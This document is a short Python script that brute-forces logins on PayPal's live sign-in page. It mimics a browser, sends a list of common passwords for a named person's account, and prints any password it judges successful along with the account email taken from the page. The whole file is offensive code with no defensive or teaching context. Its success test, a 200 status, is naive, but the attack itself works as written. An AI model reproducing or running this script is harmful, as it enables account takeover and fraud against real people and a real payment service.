import requests
import time
import re

# Replace with actual login URL and form data
login_url = "https://www.paypal.com/signin?locale.x=nl_NL"
headers = {
    "Host": "www.paypal.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept-Language": "en-GB,en;q=0.9",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "https://www.paypal.com/signin?locale.x=nl_NL"
}

# Sample password list (you can load from a file or use a dictionary)
passwords = [
    "password", "123456", "123456789", "qwerty", "abc123", "admin", "12345678",
    "letmein", "hello", "1234567890", "111111", "123123", "666666", "777777",
    "888888", "999999", "000000", "123321", "12345", "1234567", "1234567890123456"
]

# Sample username (you can replace this with a list or extract from HTML)
username = "Maryline Lelei"

# Function to extract user email from HTML
def extract_email(html):
    email_match = re.search(r'<span class="email">([^<]+)</span>', html)
    if email_match:
        return email_match.group(1)
    return "Email not found"

# Brute-force loop
for pwd in passwords:
    payload = {
        "login": username,
        "password": pwd,
        "remember_me": "true"
    }

    response = requests.post(login_url, headers=headers, data=payload)
    html = response.text

    if response.status_code == 200:
        print(f"[SUCCESS] Password found: {pwd}")
        print(f"[INFO] User email: {extract_email(html)}")
        print(f"[INFO] Login details: Email - {extract_email(html)}, Password - {pwd}")
        break
    else:
        print(f"[TRYING] Password: {pwd} | Status: {response.status_code}")

    time.sleep(0.5)
